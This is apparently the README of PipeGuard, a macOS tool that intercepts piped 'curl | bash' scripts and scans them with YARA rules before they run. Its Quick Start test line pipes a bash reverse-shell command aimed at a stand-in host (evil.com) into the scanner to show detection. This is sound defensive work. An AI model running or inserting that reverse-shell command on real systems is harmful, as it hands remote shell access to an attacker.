# PipeGuard

**Stop malware before it runs. Block `curl | bash` attacks on macOS.**

---

## Quick Start

```bash
# Install (requires Homebrew)
curl -fsSL https://raw.githubusercontent.com/SecurityRonin/pipeguard/main/install.sh | bash

# Restart your shell or run:
source ~/.zshrc  # or ~/.bashrc

# Test protection
echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' | pipeguard scan
```

**Done.** PipeGuard now protects every `curl | bash` command you run.

---

## The Problem

You run this every day:

```bash
curl https://example.com/install.sh | bash
```

Homebrew uses it. Rust uses it. Docker uses it. Developers trust it.

**Attackers exploit this trust.**

In 2024-2025, campaigns like **ClickFix** and **AMOS** use fake CAPTCHAs, poisoned search results, and AI-generated guides to trick users into pasting malicious commands. Microsoft reports a [500% increase](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/) in these attacks.

**Your antivirus fails.** Traditional AV scans files on disk. `curl | bash` streams directly to the shell interpreter. No file hits disk. No scan happens. No protection.

---

## What PipeGuard Does

PipeGuard intercepts pipes before execution and scans content in real-time:

1. **Intercepts** - Shell wrappers catch `curl | bash` patterns
2. **Filters** - Smart detection skips binaries, scans scripts
3. **Scans** - YARA rules detect malicious patterns
4. **Blocks** - Stops threats before code executes

Three severity levels:
- 🟢 **Low (1-6)** - Warns, allows execution
- 🟡 **Medium (7-8)** - Prompts for confirmation
- 🔴 **High (9-10)** - Blocks execution

---

## Features

**Smart Content Filtering**
- Automatically skips binary files (images, archives, executables)
- Scans shell scripts and installation commands
- Reduces performance overhead on legitimate downloads

**Real-Time Protection**
- Intercepts paste events (ZLE hooks)
- Wraps `curl` and `wget` commands
- Logs all piped commands for audit

**YARA Detection**
- Reverse shells (bash, netcat, Python, Perl)
- Crypto wallet theft patterns
- Persistence mechanisms (crontab, LaunchAgents)
- Supply chain attacks (malicious npm/pip packages)
- Base64 obfuscation and quarantine bypass

**Automatic Updates**
- Cryptographically verified rule updates
- Automatic checks on shell startup (configurable interval)
- One-command rollback if issues arise
- Safe defaults (notify, don't auto-apply)

**Zero Configuration**
- Install once, stays active
- Works with existing shells (bash/zsh)
- Configurable via `~/.config/pipeguard/config.toml`

---

## How It Works

```
User runs: curl https://... | bash
                  ↓
    ┌─────────────────────────┐
    │  Shell Wrapper          │
    │  (intercepts curl)      │
    └─────────┬───────────────┘
              ↓
    ┌─────────────────────────┐
    │  Smart Filter           │
    │  Binary? → Skip         │
    │  Script? → Scan         │
    └─────────┬───────────────┘
              ↓
    ┌─────────────────────────┐
    │  YARA Scanner           │
    │  56+ detection rules    │
    └─────────┬───────────────┘
              ↓
    ┌─────────────────────────┐
    │  Threat Level           │
    │  🟢 Allow / 🟡 Warn /   │
    │  🔴 Block               │
    └─────────────────────────┘
```

---

## Installation

### Requirements
- macOS (Intel or Apple Silicon)
- Homebrew (for YARA library)
- bash 4+ or zsh

### Install

```bash
curl -fsSL https://raw.githubusercontent.com/SecurityRonin/pipeguard/main/install.sh | bash
```

The installer:
1. Installs YARA library via Homebrew
2. Builds pipeguard binary
3. Configures shell integration
4. Creates default config

### Manual Installation

```bash
# Clone repository
git clone https://github.com/SecurityRonin/pipeguard.git
cd pipeguard

# Run installer
./install.sh
```

### Uninstall

```bash
./install.sh --uninstall
```

---

## Configuration

Edit `~/.config/pipeguard/config.toml`:

```toml
[response]
low = "warn"      # Options: allow, warn, prompt, block
medium = "prompt"
high = "block"

[allowlist]
domains = [
    "brew.sh",
    "raw.githubusercontent.com",
    "rust-lang.org",
]

[updates]
enabled = true                # Enable automatic update checks
auto_apply = false            # Notify but don't auto-apply (safe default)
check_interval_hours = 24     # Check for updates daily
keep_versions = 3             # Keep last 3 versions for rollback
```

### Update Commands

```bash
# Check for updates
pipeguard update check

# Apply available update
pipeguard update apply

# Show current version
pipeguard update status

# Rollback to previous version
pipeguard update rollback --version 1.0.0

# Cleanup old versions
pipeguard update cleanup
```

---

## Status

**Implementation Complete. Testing in Progress.**

- ✅ YARA rule engine (56 rules across 15 threat categories)
- ✅ Shell integration (bash/zsh)
- ✅ Smart content filtering (binary vs script detection)
- ✅ Automatic updates (Ed25519 verified, rollback support)
- ✅ Installer script
- ✅ Comprehensive test suite (32 tests passing)
- 🔄 Real-world validation
- 🔄 Performance benchmarks

---

## Why PipeGuard?

| Traditional AV | PipeGuard |
|----------------|-----------|
| Scans files on disk | Intercepts pipes before execution |
| Detects malware after it runs | Blocks malware before it runs |
| Binary-only protection | Script-aware protection |
| Requires kernel extensions | Works in userspace |

---

## Technical Documentation

- **Architecture** - See [paper/](paper/) for threat model, detection pipeline, and design decisions
- **YARA Rules** - See [rules/core.yar](rules/core.yar) for detection patterns
- **API Reference** - Run `pipeguard --help` for CLI documentation
- **Testing** - See [tests/](tests/) for test coverage

---

## Contributing

Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

Research collaboration: albert@securityronin.com

---

## License

MIT License - Copyright (c) 2026 Security Ronin

---

## Enterprise

[**PipeGuard Pro**](https://github.com/SecurityRonin/pipeguard-pro) adds:
- Cloud AI analysis for novel threats
- MDM integration (Jamf, Kandji, Mosyle, Intune)
- Fleet-wide policy enforcement
- Centralized rule distribution
- Audit log aggregation

Contact: enterprise@pipeguard.dev
